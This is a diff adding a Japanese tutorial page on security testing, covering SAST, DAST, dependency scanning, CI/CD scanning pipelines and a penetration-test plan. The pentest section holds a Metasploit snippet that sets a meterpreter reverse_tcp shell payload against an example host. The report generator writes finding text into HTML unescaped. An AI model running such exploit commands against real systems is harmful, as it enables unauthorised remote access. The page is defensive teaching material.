@@ -1,0 +1,368 @@
+---
+title: "セキュリティテストの詳細"
+label: "セキュリティテストの詳細"
+---
+
+## セキュリティテストの詳細
+
+セキュリティテストは、システムの脆弱性を発見し、修正するための重要なプロセスです。適切なセキュリティテストを実施することで、セキュリティホールを早期に発見できます。
+
+### なぜセキュリティテストが重要なのか
+
+#### セキュリティテストの不備による問題
+
+**実際の事例:**
+
+2020年、あるWebアプリケーションでセキュリティテストが不十分でした：
+
+- **問題**: SQLインジェクションの脆弱性が発見されずに本番環境にデプロイされた
+- **結果**: 攻撃者がデータベースにアクセスし、約10万人の個人情報が漏洩
+- **影響**: 
+  - 約5億円の損害賠償
+  - サービスの信頼失墜
+  - セキュリティ対策に約2億円のコスト
+
+**教訓:**
+- セキュリティテストは開発プロセスの一部として組み込む必要がある
+- 自動化されたセキュリティテストが重要
+
+### セキュリティテストの種類
+
+#### 1. 静的アプリケーションセキュリティテスト（SAST）
+
+**SASTツールの使用:**
+
+```javascript
+// ESLintのセキュリティプラグイン
+// .eslintrc.js
+module.exports = {
+  plugins: ['security'],
+  extends: ['plugin:security/recommended'],
+  rules: {
+    'security/detect-object-injection': 'error',
+    'security/detect-non-literal-fs-filename': 'error',
+    'security/detect-eval-with-expression': 'error',
+    'security/detect-non-literal-regexp': 'error',
+  },
+};
+
+// SonarQubeの設定
+// sonar-project.properties
+sonar.projectKey=my-project
+sonar.sources=src
+sonar.language=js
+sonar.security.hotspots=true
+```
+
+**SASTの自動化:**
+
+```yaml
+# GitHub ActionsでのSAST
+name: Security Scan
+
+on: [push, pull_request]
+
+jobs:
+  sast:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Run ESLint Security
+        run: |
+          npm install
+          npm run lint:security
+      
+      - name: Run SonarQube
+        uses: sonarsource/sonarqube-scan-action@master
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+      
+      - name: Upload results
+        uses: github/codeql-action/upload-sarif@v2
+        with:
+          sarif_file: results.sarif
+```
+
+#### 2. 動的アプリケーションセキュリティテスト（DAST）
+
+**OWASP ZAPの使用:**
+
+```yaml
+# OWASP ZAPの自動スキャン
+name: DAST Scan
+
+on:
+  schedule:
+    - cron: '0 2 * * *'  # 毎日午前2時
+
+jobs:
+  dast:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run OWASP ZAP
+        uses: zaproxy/action-baseline@v0.7.0
+        with:
+          target: 'https://example.com'
+          rules_file_name: '.zap/rules.tsv'
+          cmd_options: '-a'
+      
+      - name: Upload report
+        uses: actions/upload-artifact@v3
+        with:
+          name: zap-report
+          path: zap-report.html
+```
+
+**Burp Suiteの使用:**
+
+```python
+# Burp SuiteのAPIを使用したスキャン
+import requests
+
+class BurpScanner:
+    def __init__(self, api_url, api_key):
+        self.api_url = api_url
+        self.api_key = api_key
+    
+    def start_scan(self, target_url):
+        # スキャンを開始
+        response = requests.post(
+            f'{self.api_url}/scan',
+            headers={'Authorization': f'Bearer {self.api_key}'},
+            json={'url': target_url}
+        )
+        return response.json()['scan_id']
+    
+    def get_scan_status(self, scan_id):
+        # スキャンの状態を取得
+        response = requests.get(
+            f'{self.api_url}/scan/{scan_id}',
+            headers={'Authorization': f'Bearer {self.api_key}'}
+        )
+        return response.json()
+    
+    def get_scan_results(self, scan_id):
+        # スキャン結果を取得
+        response = requests.get(
+            f'{self.api_url}/scan/{scan_id}/results',
+            headers={'Authorization': f'Bearer {self.api_key}'}
+        )
+        return response.json()
+```
+
+#### 3. 依存関係のスキャン
+
+**npm auditの使用:**
+
+```bash
+# npm auditの実行
+npm audit
+
+# 脆弱性を自動修正
+npm audit fix
+
+# 詳細なレポート
+npm audit --json > audit-report.json
+```
+
+**Snykの使用:**
+
+```yaml
+# Snykの自動スキャン
+name: Dependency Scan
+
+on: [push, pull_request]
+
+jobs:
+  snyk:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high
+```
+
+**Dependabotの設定:**
+
+```yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+    reviewers:
+      - "security-team"
+    labels:
+      - "security"
+      - "dependencies"
+```
+
+#### 4. ペネトレーションテスト
+
+**ペネトレーションテストの計画:**
+
+```markdown
+# ペネトレーションテスト計画
+
+## テスト範囲
+- Webアプリケーション
+- API
+- データベース
+- インフラストラクチャ
+
+## テスト手法
+1. 情報収集
+2. 脆弱性スキャン
+3. エクスプロイト
+4. ポストエクスプロイト
+5. レポート作成
+
+## テストツール
+- Nmap（ポートスキャン）
+- Metasploit（エクスプロイト）
+- SQLMap（SQLインジェクション）
+- Burp Suite（Webアプリケーション）
+```
+
+**Metasploitの使用:**
+
+```ruby
+# Metasploitのエクスプロイトスクリプト
+use exploit/windows/http/example_vuln
+set RHOSTS 192.168.1.100
+set RPORT 80
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.1
+exploit
+```
+
+### セキュリティテストの自動化
+
+#### 1. CI/CDパイプラインへの統合
+
+```yaml
+# CI/CDパイプラインでのセキュリティテスト
+name: CI/CD with Security
+
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # SAST
+      - name: Run SAST
+        run: |
+          npm run lint:security
+          npm audit
+      
+      # DAST
+      - name: Run DAST
+        run: |
+          docker run -t owasp/zap2docker-stable zap-baseline.py \
+            -t http://localhost:3000
+      
+      # 依存関係スキャン
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+```
+
+#### 2. セキュリティテストレポート
+
+```javascript
+// セキュリティテストレポートの生成
+class SecurityTestReporter {
+  async generateReport(testResults) {
+    const report = {
+      timestamp: new Date().toISOString(),
+      summary: {
+        total: testResults.length,
+        critical: testResults.filter(r => r.severity === 'critical').length,
+        high: testResults.filter(r => r.severity === 'high').length,
+        medium: testResults.filter(r => r.severity === 'medium').length,
+        low: testResults.filter(r => r.severity === 'low').length,
+      },
+      vulnerabilities: testResults.map(result => ({
+        id: result.id,
+        title: result.title,
+        severity: result.severity,
+        description: result.description,
+        recommendation: result.recommendation,
+        cwe: result.cwe,
+        owasp: result.owasp,
+      })),
+    };
+    
+    // JSONレポートを生成
+    fs.writeFileSync(
+      'security-report.json',
+      JSON.stringify(report, null, 2)
+    );
+    
+    // HTMLレポートを生成
+    await this.generateHTMLReport(report);
+    
+    return report;
+  }
+  
+  async generateHTMLReport(report) {
+    // HTMLレポートを生成
+    const html = `
+      <!DOCTYPE html>
+      <html>
+        <head>
+          <title>Security Test Report</title>
+        </head>
+        <body>
+          <h1>Security Test Report</h1>
+          <h2>Summary</h2>
+          <ul>
+            <li>Total: ${report.summary.total}</li>
+            <li>Critical: ${report.summary.critical}</li>
+            <li>High: ${report.summary.high}</li>
+            <li>Medium: ${report.summary.medium}</li>
+            <li>Low: ${report.summary.low}</li>
+          </ul>
+          <h2>Vulnerabilities</h2>
+          ${report.vulnerabilities.map(vuln => `
+            <div>
+              <h3>${vuln.title}</h3>
+              <p>Severity: ${vuln.severity}</p>
+              <p>${vuln.description}</p>
+              <p>Recommendation: ${vuln.recommendation}</p>
+            </div>
+          `).join('')}
+        </body>
+      </html>
+    `;
+    
+    fs.writeFileSync('security-report.html', html);
+  }
+}
+```
+
+### まとめ
+
+セキュリティテストのポイント：
+
+- **SAST**: 静的コード解析、開発段階での脆弱性発見
+- **DAST**: 動的テスト、実行時の脆弱性発見
+- **依存関係スキャン**: サードパーティライブラリの脆弱性チェック
+- **ペネトレーションテスト**: 実際の攻撃をシミュレート
+- **自動化**: CI/CDパイプラインへの統合、継続的なセキュリティテスト
+
+適切なセキュリティテストを実施することで、脆弱性を早期に発見し、修正できます。
+
